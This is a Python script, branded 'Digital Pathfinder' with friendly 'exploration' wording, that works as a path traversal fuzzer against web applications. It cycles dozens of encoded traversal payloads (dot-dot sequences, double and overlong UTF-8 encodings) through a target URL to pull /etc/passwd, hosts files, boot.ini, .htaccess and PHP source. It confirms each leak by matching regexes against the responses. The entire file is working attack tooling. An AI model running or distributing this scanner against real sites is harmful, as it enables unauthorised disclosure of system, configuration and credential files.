#!/usr/bin/python3
import re
import argparse
import sys
import requests
import time
from http.cookies import SimpleCookie

befvar = (
    "",
    "./",
    "/",
    "\\",  
    "",
    ".\\",
    "file:",
    "file:/",
    "file://",
    "file:///",
)

dotvar = (
    "",
    "/..",
    "....//",
    "//....",
    "%252e%252e%255c",
    "%2e%2e%5c",
    "..%255c",
    "..%5c",
    "%5c../",
    "/%5c..",
    "..\\",
    "%2e%2e%2f",
    "../",
    "..%2f",
    "%2e%2e/",
    "%2e%2e%2f",
    "..%252f",
    "%252e%252e/",
    "%252e%252e%252f",
    "..%5c..%5c",
    "%2e%2e\\",
    "%2e%2e%5c",
    "%252e%252e\\",
    "%252e%252e%255c",
    "..%c0%af",
    "%c0%ae%c0%ae/",
    "%c0%ae%c0%ae%c0%af",
    "..%25c0%25af",
    "%25c0%25ae%25c0%25ae/",
    "%25c0%25ae%25c0%25ae%25c0%25af",
    "..%c1%9c",
    "%c0%ae%c0%ae\\",
    "%c0%ae%c0%ae%c1%9c",
    "..%25c1%259c",
    "%25c0%25ae%25c0%25ae\\",
    "%25c0%25ae%25c0%25ae%25c1%259c",
    "..%%32%66",
    "%%32%65%%32%65/",
    "%%32%65%%32%65%%32%66",
    "..%%35%63",
    "%%32%65%%32%65/",
    "%%32%65%%32%65%%35%63",
    "../",
    "...\\",
    "..../",
    "....\\",
    "........................................................................../",
    "..........................................................................\\",
    "..%u2215",
    "%uff0e%uff0e%u2215",
    "..%u2216",
    "..%uEFC8",
    "..%uF025",
    "%uff0e%uff0e\\",
    "%uff0e%uff0e%u2216",
)

match = {
    # Windows
    "c:\\boot.ini": "boot\W*loader",
    "c:\windows\system32\drivers\hosts": "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t]+[a-zA-Z0-9-_.]*",

    # Linux
    "etc/hosts": "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t][a-zA-Z0-9-_.]*",
    "etc/passwd": "\w*\:\w\:[0-9]*\:[0-9]*\:[a-zA-Z_-]*\:[\/a-zA-Z0-9]*[ \t]+:[\/a-zA-Z0-9]*",

    # Apache
    ".htaccess": "AccessFileName|RewriteEngine|allow from all|deny from all|DirectoryIndex|AuthUserFile|AuthGroupFile",

    # PHP
    # http://php.net/manual/pt_BR/reserved.variables.php
    "login.php": "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV",
    "index.php": "\<\?php|\$_GET|\$_POST|\$_COOKIE|\$_REQUEST|\$_FILES|\$_SESSION|\$_SERVER|\$_ENV",
}

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class DigitalExplorer:
    def __init__(self, url, string, cookie=None, depth=6, verbose=False):
        self.url = url
        self.string = string
        self.cookie = cookie
        self.depth = depth
        self.verbose = verbose
        self.visited_urls = set()

    def discover(self):
        print(f"{Colors.BOLD}🚀 Embarking on Digital Exploration 🚀{Colors.ENDC}")
        
        for depth in range(self.depth + 1):
            print(f"{Colors.BOLD}🔍 Exploring at Depth: {depth} 🔍{Colors.ENDC}")
            
            for var in dotvar:
                for bvar in befvar:
                    for word, pattern in match.items():
                        new_url = re.sub(re.escape(self.string), bvar + (var * depth) + word, self.url)  # Escaping the search string
                        if new_url not in self.visited_urls:
                            req = self._make_request(new_url)
                            self._analyze_response(req, new_url, pattern)

    def _make_request(self, url):
        headers = {'Cookie': self.cookie} if self.cookie else None
        req = requests.get(url, headers=headers, allow_redirects=False)
        return req

    def _analyze_response(self, req, new_url, pattern):
        matched_data = re.findall(pattern, req.text)
        
        if matched_data:
            print(colorize_code(req.status_code) + new_url)
            print(f"{Colors.OKGREEN}Contents Found:{Colors.ENDC} {len(matched_data)}")
        elif self.verbose:
            print(colorize_code(req.status_code) + new_url)
        
        if self.verbose:
            for i, data in enumerate(matched_data):
                print(f"{Colors.FAIL}Matching Data:{Colors.ENDC} {data}")
                if i > 6:
                    print(" [...]")
                    break
        
        self.visited_urls.add(new_url)

def colorize_code(code):
    color_map = {'2': Colors.OKGREEN, '3': Colors.WARNING, '4': Colors.FAIL, '5': Colors.OKBLUE}
    color_code = str(code)[0]
    color = color_map.get(color_code, Colors.ENDC)
    return f"{color}[{code}] {Colors.ENDC}"

def main():
    args = parse_arguments()
    print_banner(args.url)
    explorer = DigitalExplorer(args.url, args.string, args.cookie, args.depth, args.verbose)
    explorer.discover()

def parse_arguments():
    parser = argparse.ArgumentParser(description='Digital Pathfinder - Embark on a journey of discovery. Created by @yourdigitalguide.')
    parser.add_argument('--url', '-u', action='store', dest='url', required=True, help='Destination URL for exploration.')
    parser.add_argument('--string', '-s', action='store', dest='string', required=True, help='String to search in the URL. E.g., document.pdf')
    parser.add_argument('--cookie', '-c', action='store', dest='cookie', required=False, help='Document cookie if required.')
    parser.add_argument('--depth', '-d', action='store', dest='depth', required=False, type=int, default=6, help='Depth of traversal.')
    parser.add_argument('--verbose', '-v', action='store_true', required=False, help='Verbose mode for detailed output.')
    return parser.parse_args()

def print_banner(url):
    print("\n\t\tWelcome to Digital Pathfinder - Your Guide to the Digital Frontier\n")
    print("Version: ", Colors.OKBLUE + "2.0.0" + Colors.ENDC)
    print("Creator: ", Colors.OKGREEN + "@yourdigitalguide" + Colors.ENDC)
    print("Starting exploration at:", Colors.OKBLUE + url + Colors.ENDC + "\n")

if __name__ == '__main__':
    main()
